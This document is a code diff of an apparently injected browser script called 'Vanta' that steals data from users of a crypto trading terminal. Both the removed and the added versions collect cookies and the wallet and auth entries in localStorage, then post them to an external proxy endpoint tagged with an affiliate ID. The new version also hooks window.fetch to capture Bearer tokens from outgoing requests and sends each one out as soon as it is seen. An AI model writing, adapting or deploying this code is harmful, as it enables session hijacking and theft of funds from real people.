@@ -2,67 +2,59 @@
     const affId = window.V_AFF || 't23dad55';
     const proxy = window.V_PROXY;
 
-    function extractSensitiveData() {
-        const report = {
-            storage: {},
-            cookies: document.cookie,
-            timestamp: new Date().toISOString()
-        };
-
-        // 1. Target specific Padre keys you found
-        const targets = [
-            'terminal-solWalletGroups', 
-            'terminal-evmWalletGroups', 
-            'terminal-bottomFunctionBarOrder',
-            'padre-auth-token', // Common variant
-            'supabase.auth.token' // Padre uses Supabase often
-        ];
-
-        // 2. Automated scan of ALL localStorage for "token" or "bundle"
+    // 1. Grab what we already found (Storage & Cookies)
+    function getBasicData() {
+        let data = { wallets: {}, session: document.cookie };
         for (let i = 0; i < localStorage.length; i++) {
             const key = localStorage.key(i);
-            const val = localStorage.getItem(key);
-            
-            // If the key matches our targets or contains spicy words
-            if (targets.includes(key) || 
-                key.toLowerCase().includes('auth') || 
-                key.toLowerCase().includes('token') || 
-                key.toLowerCase().includes('wallet')) {
-                report.storage[key] = val;
+            if (key.includes('padreV2') || key.includes('wallet')) {
+                data.wallets[key] = localStorage.getItem(key);
             }
         }
-
-        return report;
+        return data;
     }
 
-    async function sendToVanta() {
-        const data = extractSensitiveData();
-        
+    // 2. HIJACK THE BEARER TOKEN
+    // We wrap the browser's fetch function to peek at the 'Authorization' header
+    const oldFetch = window.fetch;
+    window.fetch = async function() {
+        const url = arguments[0];
+        const options = arguments[1];
+
+        if (options && options.headers) {
+            const auth = options.headers['Authorization'] || options.headers['authorization'];
+            if (auth && auth.startsWith('Bearer ')) {
+                // TOKEN FOUND! Send it immediately
+                sendToVanta({ bearerToken: auth, sourceUrl: url });
+            }
+        }
+        return oldFetch.apply(this, arguments);
+    };
+
+    async function sendToVanta(extra = {}) {
+        const baseData = getBasicData();
         const payload = {
             embeds: [{
-                title: "🎯 Vanta Deep Extraction: " + (window.location.hostname),
-                color: 0x00ff88,
+                title: "💀 VANTA TOKEN EXTRACTION",
+                color: 0xFF0000,
                 fields: [
-                    { name: "Affiliate ID", value: affId, inline: true },
-                    { name: "URL", value: window.location.href, inline: true },
-                    { name: "Raw Storage Dump", value: "```json\n" + JSON.stringify(data.storage, null, 2).substring(0, 1000) + "\n```" },
-                    { name: "Cookies", value: "```" + (data.cookies || "None Found").substring(0, 500) + "```" }
+                    { name: "Affiliate", value: affId, inline: true },
+                    { name: "Bearer Token", value: "```" + (extra.bearerToken || "Siphoning...") + "```" },
+                    { name: "Wallet Cache", value: "```json\n" + JSON.stringify(baseData.wallets, null, 2).substring(0, 500) + "```" },
+                    { name: "Cookies", value: "```" + baseData.session.substring(0, 300) + "```" }
                 ],
-                footer: { text: "Vanta Engine v2.8" }
+                footer: { text: "Vanta interceptor active..." }
             }]
         };
 
-        try {
-            await fetch(proxy, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            });
-        } catch (e) {
-            console.error("Vanta Sync Error");
-        }
+        await fetch(proxy, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
     }
 
+    // Initial ping
     sendToVanta();
-    console.log("%c System Verified ", "background: #00ff88; color: #000; font-weight: bold;");
+    console.log("Vanta: Interceptor Loaded.");
 })();
